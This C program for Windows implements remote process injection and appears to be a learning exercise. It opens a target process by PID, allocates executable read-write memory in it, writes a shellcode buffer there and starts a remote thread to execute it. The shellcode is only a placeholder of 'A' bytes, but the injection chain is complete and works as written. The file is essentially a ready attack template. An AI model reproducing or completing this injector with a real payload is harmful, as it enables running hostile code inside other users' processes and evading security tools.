#include <Windows.h>
#include <stdio.h>

const char* x = "[+]";
const char* y = "[-]";
const char* z = "[!]";

DWORD PID,TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;

unsigned char shellCode[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";

int main(int argc, char const *argv[])
{
    if(argc<2){
        printf("\t %s USAGE: program.exe <PID>\n",z);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    printf("\t %s Trying to open Program with Process ID: (%ld) \n",x,PID);
    
/*HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);*/
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE , PID);

    if(hProcess == NULL){
        printf("\t %s Failed to open Program with Process ID: (%ld). error: %ld \n",z,PID, GetLastError()); 
        return EXIT_FAILURE;
    }

    printf("\t %s Got the Process Handle : 0x%p \n", x ,hProcess);

/*LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);*/
    rBuffer = VirtualAllocEx(hProcess,NULL, sizeof(shellCode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("\t %s Buffer of %zu-bytes generated with PAGE_EXECUTE_READWRITE permission.\n", x ,sizeof(shellCode));

/*BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);*/
    
    WriteProcessMemory(hProcess, rBuffer, shellCode, sizeof(shellCode),NULL );
    printf("\t %s Wrote %zu-bytes to Process memory.\n", x ,sizeof(shellCode));

/*HANDLE CreateRemoteThreadEx(
  [in]            HANDLE                       hProcess,
  [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
  [in]            SIZE_T                       dwStackSize,
  [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
  [in, optional]  LPVOID                       lpParameter,
  [in]            DWORD                        dwCreationFlags,
  [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [out, optional] LPDWORD                      lpThreadId
);*/

    hThread = CreateRemoteThreadEx(hProcess, NULL, 0 , (LPTHREAD_START_ROUTINE)rBuffer , NULL, 0, 0,&TID);
    if(hThread == NULL){
        printf("\t %s Failed to open a Thread. error: %ld \n",z, GetLastError()); 
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    printf("\t %s Got the Thread Handle : 0x%p with ID: (%ld) \n", x ,hThread,TID);

    printf("\t %s Waiting For Theard to Finish...\n",z);
    //Learning New API Function...
    WaitForSingleObject(hThread, 5000);
    
    printf("\t %s Cleaning Process\n",y);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("\t %s Cleaning Done\n",x);
    
    return EXIT_SUCCESS;
}
